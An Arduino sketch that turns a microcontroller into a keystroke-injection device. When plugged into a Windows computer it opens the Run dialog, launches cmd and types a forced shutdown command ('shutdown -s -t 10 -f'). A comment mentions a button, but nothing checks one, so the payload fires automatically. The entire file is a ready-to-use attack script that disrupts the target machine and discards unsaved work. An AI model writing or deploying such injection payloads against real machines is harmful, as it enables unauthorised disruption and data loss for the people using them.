#include "Keyboard.h"

void setup() {
  // make pin 2 an input and turn on the 
  // pullup resistor so it goes high unless
  // connected to ground:
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
}

void loop() {
  //if the button is pressed

    delay(2000);
    Keyboard.press(0x83);
    delay(100);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print("cmd");
    delay(100);
    Keyboard.write(0xB0);
    delay(1000);
    Keyboard.print("shutdown -s  -t 10 -f");
    delay(200);
    Keyboard.write(0xB0);
    delay(100);
    Keyboard.write(0xB0);
    delay(100);
    Keyboard.write(0xB0);
    delay(100);
    Keyboard.print("exit");
    delay(334234523);
    
    
    delay(500000000);

 
}
